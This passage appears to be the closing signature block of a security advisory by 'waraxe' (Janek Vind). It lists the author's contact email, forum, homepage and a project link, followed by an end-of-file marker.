+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
